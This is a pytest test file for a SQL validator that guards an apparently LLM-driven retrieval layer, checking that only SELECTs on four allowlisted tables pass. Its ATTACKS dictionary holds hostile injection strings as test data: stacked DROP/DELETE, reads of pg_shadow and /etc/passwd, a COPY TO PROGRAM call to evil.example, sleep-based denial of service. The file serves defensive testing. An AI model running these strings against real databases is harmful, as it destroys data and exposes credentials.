"""
Unit tests for SQL safety layer in src/retrieval/sql.py.

validate_sql() is a pure function — no DB, no LLM.
Tests prove ADR-002: sqlglot rejects all non-SELECT statements.
"""

import pytest
from src.rag.sql import validate_sql, ALLOWED_TABLES


# ---------------------------------------------------------------------------
# ALLOWED_TABLES allowlist
# ---------------------------------------------------------------------------

class TestAllowedTables:
    def test_customers_allowed(self):
        assert "customers" in ALLOWED_TABLES

    def test_support_tickets_allowed(self):
        assert "support_tickets" in ALLOWED_TABLES

    def test_incident_logs_allowed(self):
        assert "incident_logs" in ALLOWED_TABLES

    def test_knowledge_article_usage_allowed(self):
        assert "knowledge_article_usage" in ALLOWED_TABLES

    def test_no_unexpected_tables(self):
        assert len(ALLOWED_TABLES) == 4


# ---------------------------------------------------------------------------
# validate_sql — SELECT passes
# ---------------------------------------------------------------------------

class TestValidSqlPasses:
    def test_simple_select_passes(self):
        ok, err = validate_sql("SELECT * FROM customers LIMIT 10")
        assert ok is True
        assert err == ""

    def test_select_with_where_passes(self):
        ok, err = validate_sql(
            "SELECT customer_id, company_name FROM customers WHERE subscription_tier = 'Enterprise'"
        )
        assert ok is True

    def test_select_with_join_passes(self):
        ok, err = validate_sql(
            "SELECT c.company_name, t.severity_level "
            "FROM customers c JOIN support_tickets t ON c.customer_id = t.customer_id "
            "LIMIT 10"
        )
        assert ok is True

    def test_select_with_order_by_passes(self):
        ok, err = validate_sql(
            "SELECT * FROM support_tickets ORDER BY created_at DESC LIMIT 5"
        )
        assert ok is True

    def test_cte_select_passes(self):
        ok, err = validate_sql(
            "WITH recent AS (SELECT * FROM support_tickets LIMIT 10) "
            "SELECT * FROM recent"
        )
        assert ok is True


# ---------------------------------------------------------------------------
# validate_sql — DML rejected
# ---------------------------------------------------------------------------

class TestDmlRejected:
    def test_insert_rejected(self):
        ok, err = validate_sql(
            "INSERT INTO customers (company_name) VALUES ('Evil Corp')"
        )
        assert ok is False
        assert "SELECT" in err or "Insert" in err

    def test_update_rejected(self):
        ok, err = validate_sql(
            "UPDATE customers SET account_status = 'Suspended' WHERE customer_id = 1"
        )
        assert ok is False

    def test_delete_rejected(self):
        ok, err = validate_sql(
            "DELETE FROM support_tickets WHERE ticket_id = 99"
        )
        assert ok is False

    def test_drop_rejected(self):
        ok, err = validate_sql("DROP TABLE customers")
        assert ok is False

    def test_create_rejected(self):
        ok, err = validate_sql(
            "CREATE TABLE evil (id SERIAL PRIMARY KEY, data TEXT)"
        )
        assert ok is False


# ---------------------------------------------------------------------------
# validate_sql — disallowed tables rejected
# ---------------------------------------------------------------------------

class TestDisallowedTablesRejected:
    def test_unlisted_table_rejected(self):
        ok, err = validate_sql("SELECT * FROM users LIMIT 10")
        assert ok is False
        assert "not in schema" in err

    def test_pg_catalog_rejected(self):
        ok, err = validate_sql("SELECT * FROM pg_catalog.pg_tables")
        assert ok is False

    def test_multiple_disallowed_tables_rejected(self):
        ok, err = validate_sql(
            "SELECT a.*, b.* FROM users a JOIN admin_logs b ON a.id = b.user_id"
        )
        assert ok is False

    def test_cte_alias_not_flagged_as_disallowed(self):
        """CTE alias 'recent_tickets' is virtual — must not be flagged as a disallowed table."""
        ok, err = validate_sql(
            "WITH recent_tickets AS (SELECT * FROM support_tickets LIMIT 10) "
            "SELECT * FROM recent_tickets"
        )
        assert ok is True, f"CTE alias incorrectly flagged: {err}"


# ---------------------------------------------------------------------------
# validate_sql — malformed SQL
# ---------------------------------------------------------------------------

class TestMalformedSqlRejected:
    def test_empty_string_rejected(self):
        ok, err = validate_sql("")
        assert ok is False

    def test_non_sql_text_rejected(self):
        ok, err = validate_sql("not a sql statement at all !!!")
        assert ok is False


# ---------------------------------------------------------------------------
# validate_sql — attacks an LLM could be tricked into writing
# (found by probing the validator, Nov 2026)
# ---------------------------------------------------------------------------

ATTACKS = {
    "stacked_select_then_delete": "SELECT * FROM customers; DELETE FROM customers",
    "stacked_behind_comment":     "SELECT * FROM customers -- x\n; DROP TABLE customers",
    "select_into_new_table":      "SELECT * INTO stolen FROM customers",
    "cte_wrapping_delete":        "WITH d AS (DELETE FROM customers RETURNING *) SELECT * FROM d",
    "union_into_pg_shadow":       "SELECT company_name FROM customers UNION SELECT passwd FROM pg_shadow",
    "information_schema_subquery": "SELECT * FROM customers WHERE 1 = (SELECT count(*) FROM information_schema.tables)",
    "copy_to_program":            "COPY customers TO PROGRAM 'curl evil.example'",
    "pg_sleep_dos":               "SELECT pg_sleep(30) FROM customers",
    "pg_sleep_uppercase":         "SELECT PG_SLEEP(30) FROM customers",
    "pg_read_file":               "SELECT pg_read_file('/etc/passwd') FROM customers",
    "set_config_poisons_session": "SELECT set_config('search_path', 'nowhere', false) FROM customers",
    "query_to_xml_hidden_delete": "SELECT query_to_xml('DELETE FROM customers', true, true, '') FROM customers",
    "dblink_exec":                "SELECT * FROM customers WHERE 1 = (SELECT dblink_exec('x', 'DROP TABLE customers'))",
    "pg_terminate_backend":       "SELECT pg_terminate_backend(1) FROM customers",
    "for_update_lock":            "SELECT * FROM customers FOR UPDATE",
    "for_share_lock":             "SELECT * FROM customers FOR SHARE",
}

LEGIT = {
    "count_group_by":  "SELECT severity_level, COUNT(*) FROM support_tickets GROUP BY severity_level",
    "interval_now":    "SELECT * FROM support_tickets WHERE created_at >= NOW() - INTERVAL '7 days'",
    "date_functions":  "SELECT DATE_TRUNC('month', created_at), EXTRACT(YEAR FROM created_at), "
                       "COALESCE(assigned_team, 'none') FROM support_tickets",
    "join_cte_agg":    "WITH t AS (SELECT * FROM support_tickets) SELECT LOWER(c.company_name), COUNT(*) "
                       "FROM t JOIN customers c ON c.customer_id = t.customer_id GROUP BY 1",
    "case_cast_limit": "SELECT ticket_id, CASE WHEN escalation_flag THEN 'yes' ELSE 'no' END "
                       "FROM support_tickets WHERE created_at::date = CURRENT_DATE LIMIT 10",
}


@pytest.mark.parametrize("name", sorted(ATTACKS))
def test_attack_rejected(name):
    ok, err = validate_sql(ATTACKS[name])
    assert ok is False, f"attack passed validation: {name}"


@pytest.mark.parametrize("name", sorted(LEGIT))
def test_legitimate_query_still_passes(name):
    ok, err = validate_sql(LEGIT[name])
    assert ok is True, f"legitimate query rejected ({name}): {err}"
